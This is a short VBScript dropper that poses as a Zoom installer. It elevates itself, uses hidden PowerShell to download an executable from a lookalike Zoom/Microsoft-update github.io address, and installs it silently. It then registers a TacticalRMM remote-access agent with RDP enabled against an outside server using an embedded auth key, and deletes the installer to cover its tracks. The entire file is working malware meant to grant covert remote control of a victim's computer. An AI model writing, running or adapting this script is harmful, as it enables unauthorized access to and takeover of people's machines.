If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Dim oShell
Set oShell = CreateObject("WScript.Shell")

Dim strTemp
strTemp = oShell.ExpandEnvironmentStrings("%TEMP%") & "\ZoomInstaller.exe"

' Step 1: Download installer from your hosted URL
oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/ZoomInstaller.exe' -OutFile '" & strTemp & "' -UseBasicParsing""", 0, True

' Step 2: Unblock downloaded file
oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strTemp & "'""", 0, True

' Step 3: Install silently
oShell.Run """" & strTemp & """ /VERYSILENT /SUPPRESSMSGBOXES", 0, True

' Step 4: Wait for files to settle
WScript.Sleep 6000

' Step 5: Register with server
oShell.Run """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.cacgreatchallange.org --client-id 1 --site-id 1 --agent-type workstation --auth e88d652cb5e09ed94a4572bbe3ec29b4c0046d0c4ce67e9ae4712faaa8bf3e53 --rdp --ping", 0, True

' Step 6: Cleanup
oShell.Run "cmd /c del """ & strTemp & """", 0, True
